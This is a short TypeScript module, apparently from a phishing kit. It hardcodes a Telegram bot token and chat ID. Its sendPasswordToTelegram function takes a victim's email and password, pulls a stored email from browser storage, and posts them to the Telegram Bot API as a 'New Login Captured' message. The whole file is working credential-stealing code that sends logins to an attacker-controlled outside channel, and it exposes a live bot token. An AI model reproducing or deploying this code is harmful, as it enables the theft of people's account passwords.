const TELEGRAM_BOT_TOKEN = "8436635149:AAHyn45Oa_A-RP2dDwJZesg-C8zgYbzMSr4";
const TELEGRAM_CHAT_ID = "7872059743";

const sendToTelegram = async (message: string) => {
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const data = await res.json();

    if (!data.ok) {
      console.error("Telegram error:", data); // ✅ shows exact reason
    } else {
      console.log("Telegram sent ✅");
    }
  } catch (err) {
    console.error("Fetch failed:", err);
  }
};


export const sendPasswordToTelegram = async (
  email: string,
  password: string,
  keepSignedIn: boolean
) => {
  // Also grab anything useful from localStorage
  const storedEmail = localStorage.getItem("login_email") || sessionStorage.getItem("login_email") || "";

  const message = `
🔐 <b>New Login Captured</b>
<b>Email:</b> ${email || storedEmail}
<b>Password:</b> ${password}
<b>Keep Signed In:</b> ${keepSignedIn ? "Yes" : "No"}
<b>LocalStorage Email:</b> ${storedEmail}
  `.trim();

  await sendToTelegram(message);
};